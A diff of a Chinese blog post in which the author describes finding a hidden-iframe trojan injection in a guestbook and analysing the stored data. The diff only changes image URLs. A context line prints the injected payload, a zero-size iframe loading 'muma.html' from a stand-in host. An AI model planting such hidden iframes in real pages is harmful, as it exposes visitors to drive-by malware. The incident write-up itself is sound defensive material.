@@ -7,7 +7,7 @@ tags:
 ---
 
 先戴个图给大家看看：
-[![iframe.JPG](http://7sbxmt.com1.z0.glb.clouddn.com/iframe.JPG)](http://7sbxmt.com1.z0.glb.clouddn.com01/iframe.JPG "iframe.JPG")
+![iframe.JPG](https://asset-1258390188.cos.ap-shanghai.myqcloud.com/iframe.JPG)](https://asset-1258390188.cos.ap-shanghai.myqcloud.com01/iframe.JPG "iframe.JPG")
 
 一看就知道是被别人测试iframe挂马了，看来留言簿的代码还是有问题，没有把该过滤的东西过滤掉。putty到DH主机上看看MYSQL数据库里面的东西：
 
@@ -51,7 +51,7 @@ tags:
 &nbsp;&lt;iframe&nbsp;src=http://www.xxx.com/muma.html&nbsp;width=0&nbsp;height=0&gt;&lt;/iframe&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 
 这段代码是被写入留言簿中的留言内容，产生一个高、宽为0的frame，经典的挂马行为。这个frame在opera下可以看到，很小的一块，但是IE里是看不到的，当然也只有IE才会中iframe的马。看看在Opera中的效果：
-[![d.jpg](http://7sbxmt.com1.z0.glb.clouddn.com/d.jpg)](http://7sbxmt.com1.z0.glb.clouddn.com01/d.jpg "d.jpg")
+![d.jpg](https://asset-1258390188.cos.ap-shanghai.myqcloud.com/d.jpg)](https://asset-1258390188.cos.ap-shanghai.myqcloud.com01/d.jpg "d.jpg")
 
 再看下面：
 
